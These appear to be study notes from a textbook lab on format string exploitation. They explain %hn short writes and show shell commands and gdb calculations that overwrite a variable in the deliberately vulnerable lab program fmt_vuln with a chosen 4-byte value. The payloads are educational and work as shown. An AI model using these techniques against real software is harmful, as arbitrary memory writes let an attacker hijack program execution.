Another technique that can simplify format string exploits is using short writes
A short is typically a 2-byte word, and format parameters have a special way of dealing with them
__________________________________________________________________________________
The length modifier
    Here, integer conversion stands for d, i, o, u, x, or X conversion.

    h   A following integer conversion corresponds to a short int or
        unsigned short int argument, or a following n conversion
        corresponds to a pointer to a short int argument.
__________________________________________________________________________________
It means hn will convert the bytes written(which is a byte ex:17,120, etc) to a short int(17 - 0017, which when stored becomes 1700 beacuse of little-endian)

This can be used with format exploits to write 2-byte shorts
In the output below, a short is written at both ends of the 4-byte test_val variable
Direct parameter access can still be used
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%x%hn
The right way to print user-controlled input:
??%x%x%x%hn
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc0
[*] test_val @ 0x08049794 = -65515 0xffff0015

reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08")%x%x%x%hn
The right way to print user-controlled input:
??%x%x%x%hn
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc0
[*] test_val @ 0x08049794 = 1441720 0x0015ffb8

reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08")%4\$hn
The right way to print user-controlled input:
??%4$hn
The wrong way to print user-controlled input:
??
[*] test_val @ 0x08049794 = 327608 0x0004ffb8
__________________________________________________________________________________

Using short writes, an entire 4-byte value can be overwritten with just 2 %hn parameters
We will overwrite the test_val vaiable once again with 0xbffffd72
__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xfd72 - 8
$1 = 64874
(gdb) p 0xbfff - 0xfd72
$2 = -15731
(gdb) p 0x1bfff - 0xfd72
$3 = 49805
(gdb) quit

reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08\x96\x97\x04\x08")%64874x%4\$hn%49805x%5\$hn
The right way to print user-controlled input:
????%64874x%4$hn%49805x%5$hn
The wrong way to print user-controlled input:
b7fe75fc
[*] test_val @ 0x08049794 = -1073742478 0xbffffd72
__________________________________________________________________________________
We subtracted 8 beacuse 8 bytes would be printed(\x94\x97\x04\x08\x96\x97\x04\x08)
Next, we want to print bfff bytes, but we have already printed more bytes than that, so we wraparound

The preceding example uses a similar wraparound method to deal with the second write of 0xbffff being less than the first write of 0xfd72
Using short writes, the order of the writes doesn't matter, so the first write can be 0xfd72 and the second can be 0xbffff, if the two passed addresses are swapped in position
Below, the address 0x08049796 is written to first, and 0x08049794 is written to second
__________________________________________________________________________________
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xfd72 - 0xbfff
$2 = 15731
(gdb) quit
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08\x94\x97\x04\x08")%49143x%4\$hn%15731x%5\$hn
The right way to print user-controlled input:
????%49143x%4$hn%15731x%5$hn
The wrong way to print user-controlled input:
????

                                                    b7fe75fc
[*] test_val @ 0x08049794 = -1073742478 0xbffffd72
__________________________________________________________________________________

The ability to overwrite arbitrary memory address implies the ability to control the execution flow of the program
One option is to override the return address in the most recent stack frame, as was done with the stack-based overflows
While this is a possible option, there are other targets that have more predictable memory addresses
The nature of stack-based overflows only allows the overwrite of the return address, but format strings provide the ability to overwrite any memory address, which creates other possibilities